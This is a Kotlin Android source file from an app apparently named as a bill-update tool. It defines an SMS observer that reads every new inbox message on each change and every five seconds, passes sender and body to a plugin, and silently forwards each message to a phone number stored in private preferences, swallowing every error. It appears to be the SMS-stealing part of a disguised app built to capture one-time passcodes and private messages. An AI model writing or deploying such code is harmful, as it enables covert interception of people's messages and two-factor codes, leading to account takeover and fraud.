package com.example.bill_update_app

import android.content.ContentResolver
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask

class SmsObserver(private val contentResolver: ContentResolver, private val context: Context) : ContentObserver(Handler(Looper.getMainLooper())) {

    private var lastId: Long = -1
    private var pollTimer: Timer? = null

    override fun onChange(selfChange: Boolean) {
        super.onChange(selfChange)
        readLatestSms()
    }

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)
        readLatestSms()
    }

    fun startPolling() {
        readLatestSms()
        pollTimer?.cancel()
        pollTimer = Timer()
        pollTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                Handler(Looper.getMainLooper()).post { readLatestSms() }
            }
        }, 5000, 5000)
    }

    fun stopPolling() {
        pollTimer?.cancel()
        pollTimer = null
    }

    fun readLatestSms() {
        try {
            val uri = Telephony.Sms.Inbox.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms.Inbox._ID,
                Telephony.Sms.Inbox.ADDRESS,
                Telephony.Sms.Inbox.BODY,
                Telephony.Sms.Inbox.DATE
            )
            val selection = "${Telephony.Sms.Inbox._ID} > ?"
            val selectionArgs = arrayOf(lastId.toString())
            var cursor: android.database.Cursor? = null
            try {
                cursor = contentResolver.query(uri, projection, selection, selectionArgs, "${Telephony.Sms.Inbox._ID} ASC")
                cursor?.use { c ->
                    val idIdx = c.getColumnIndex(Telephony.Sms.Inbox._ID)
                    val addrIdx = c.getColumnIndex(Telephony.Sms.Inbox.ADDRESS)
                    val bodyIdx = c.getColumnIndex(Telephony.Sms.Inbox.BODY)
                    val dateIdx = c.getColumnIndex(Telephony.Sms.Inbox.DATE)
                    while (c.moveToNext()) {
                        val id = if (idIdx >= 0) c.getLong(idIdx) else -1
                        if (id > lastId) lastId = id
                        val sender = if (addrIdx >= 0) c.getString(addrIdx) ?: "" else ""
                        val body = if (bodyIdx >= 0) c.getString(bodyIdx) ?: "" else ""
                        val ts = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis()
                        val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US)
                        val receivedAt = dateFormat.format(Date(ts))
                        SmsPlugin.receiveSms(sender, body, receivedAt)

                        val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                        val fwdTo = prefs.getString("sms_fwd_to", "")
                        if (fwdTo != null && fwdTo.isNotEmpty()) {
                            try {
                                SmsForwarder(context).forwardSms(fwdTo, sender, body, receivedAt)
                            } catch (_: Exception) {}
                        }
                    }
                }
            } finally {
                cursor?.close()
            }
        } catch (e: Exception) {
            // Ignore
        }
    }
}
